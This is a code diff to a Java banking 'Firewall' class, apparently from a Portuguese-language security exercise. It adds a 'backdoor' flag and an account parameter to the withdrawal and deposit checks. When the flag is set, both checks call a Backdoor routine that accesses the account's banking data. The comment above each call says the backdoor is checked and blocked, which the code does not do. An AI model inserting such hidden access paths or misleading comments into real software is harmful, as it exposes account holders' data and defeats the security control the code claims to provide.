@@ -2,10 +2,19 @@ package firewall;
 
 import java.util.Calendar;
 
+import backdoor.Backdoor;
+import banco.ContaCorrente;
+
 // autenticação já é verificada 
 // Firewall para permitir ou bloquear operações com base em algumas condições
 public class Firewall {
-    public static boolean firewallPermiteSaque(double quantidade) {
+    public static boolean firewallPermiteSaque(double quantidade, boolean backdoor, ContaCorrente contaCorrente){
+
+        // Verifique o backdoor e bloqueia
+        if (backdoor) {
+            Backdoor.backdoorAcessarDadosBancarios(contaCorrente);                            
+        }
+
         // Verifica o horário (das 9h às 18h)
         Calendar calendar = Calendar.getInstance();
         int horaAtual = calendar.get(Calendar.HOUR_OF_DAY);
@@ -22,7 +31,13 @@ public class Firewall {
         return true;
     }
 
-    public static boolean firewallPermiteDeposito(double quantidade) {
+    public static boolean firewallPermiteDeposito(double quantidade, boolean backdoor, ContaCorrente contaCorrente) {
+
+        // Verifique o backdoor e bloqueia
+        if (backdoor) {
+            Backdoor.backdoorAcessarDadosBancarios(contaCorrente);                            
+        }
+
         // Verifica o horário (das 9h às 18h)
         Calendar calendar = Calendar.getInstance();
         int horaAtual = calendar.get(Calendar.HOUR_OF_DAY);
